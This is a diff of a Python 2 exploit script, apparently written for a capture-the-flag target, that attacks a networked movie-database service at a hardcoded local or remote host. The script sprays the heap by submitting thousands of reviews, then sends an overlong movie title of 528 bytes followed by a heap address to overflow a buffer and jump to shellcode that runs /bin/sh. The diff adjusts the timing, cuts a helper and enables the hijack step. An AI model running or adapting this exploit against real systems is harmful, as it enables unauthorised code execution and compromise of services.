@@ -3,6 +3,7 @@
 from sock import *
 import sys
 import time
+import errno
 
 ###############################################################################
 #
@@ -17,16 +18,17 @@ LOCAL = True
 if LOCAL:
     HOST = "localhost"
     PORT = "55000"
-    SLEEP_TIME = .05
+    SLEEP_TIME = .04
 else:
     HOST = "54.215.5.83"
     PORT = "3036"
-    SLEEP_TIME = .5
+    SLEEP_TIME = .1
 
 NOP = "\x90"
 
 HEAP_ADDRESS = "0x90000000"
-MAX_ENTRIES = 16384
+#MAX_ENTRIES = 16384
+MAX_ENTRIES = 2500
 
 
 # Some useful shellcode (Not Aleph One's, but it does exec \bin\sh)
@@ -116,6 +118,8 @@ def remove_movie(title,con):
     # Send the movie title
     con.send_line(title)
 
+    pause_script_msg("Press Enter to receive response")
+
     # Wait for a response
     time.sleep(1)
 
@@ -179,8 +183,8 @@ def send_movie(movie,con):
 
     # Send all the data in order
     con.send_line(movie["title"])
-    con.send_line(movie["writer"])
     con.send_line(movie["director"])
+    con.send_line(movie["writer"])
     con.send_line(movie["star1"])
     con.send_line(movie["star2"])
     con.send_line(movie["star3"])
@@ -195,52 +199,6 @@ def send_movie(movie,con):
     con.send_line(movie["aspect"])
     con.send_line(movie["composer"])
     con.send_line(movie["average_rating"])
-
-################################################################################
-#
-#   send_movie_max
-#
-#   This will add a movie using send instead of send_line, thus not sending 
-#   newlines which messup when we send max length movie fields
-#
-################################################################################
-def send_movie_max(movie,con):
-    # Choose the add option
-    con.send_line("a")
-
-    # Send all the data in order
-    con.send(movie["title"])
-    pause_script()
-    con.send(movie["director"])
-    pause_script()
-    con.send(movie["star1"])
-    pause_script()
-    con.send(movie["star2"])
-    pause_script()
-    con.send(movie["star3"])
-    pause_script()
-    con.send(movie["star4"])
-    pause_script()
-    con.send(movie["star5"])
-    pause_script()
-    con.send(movie["summary"])
-    pause_script()
-    con.send(movie["country"])
-    pause_script()
-    con.send(movie["budget"])
-    pause_script()
-    con.send(movie["opening_weekend"])
-    pause_script()
-    con.send(movie["gross"])
-    pause_script()
-    con.send(movie["runtime"])
-    pause_script()
-    con.send(movie["aspect"])
-    pause_script()
-    con.send(movie["composer"])
-    pause_script()
-    con.send(movie["average_rating"])
-    pause_script()
 
 ################################################################################
 #
@@ -263,12 +221,36 @@ def go_interactive(con):
 ################################################################################
 def hijack_execution(con):
 
-    movie_title = "Hackers"
-    # Delete the movie
-    if remove_movie(movie_title, con):
-        print "Deleted!"
-    else:
-        print "Didn't delete :("
+    # Setup overflow string
+    overflow_string = ""
+    #overflow_size = 512
+    overflow_size = 528
+
+    for i in range(0, overflow_size):
+        overflow_string += "k"
+
+    overflow_string += HEAP_ADDRESS
+
+    # Choose the remove option from the main menu
+    con.send_line("d")
+
+    # Wait for a response
+    time.sleep(SLEEP_TIME)
+
+    # Clear out the read buffer
+    con.read_one(0)
+
+    #pause_script_msg("Press Enter to Pwn")
+    
+    # Send the "movie title"
+    con.send_line(overflow_string)
+
+    #go_interactive(con)
+    #time.sleep(SLEEP_TIME)
+
+
+
+
 
 ################################################################################
 #
@@ -360,12 +342,11 @@ def build_movie():
 # Start the connection
 con = connect()
 
-pause_script_msg("Press Enter to start exploit")
+#pause_script_msg("Press Enter to start exploit")
 
 movie = build_movie()
 
 send_movie(movie, con)
-send_movie(hacker, con)
 
 print "Movie sent"
 #pause_script_msg("Press Enter to start reviews")
@@ -383,7 +364,7 @@ for i in range(0, MAX_ENTRIES):
     else:
         print `i` + ": Review Failed!"
 
-#hijack_execution(con)
+hijack_execution(con)
 
 
 
@@ -402,3 +383,9 @@ for i in range(0, MAX_ENTRIES):
 #    print "Deleted!"
 #else:
 #    print "Didn't delete :("
+
+
+
+#exit(0)
+#send_movie(hacker, con)
+
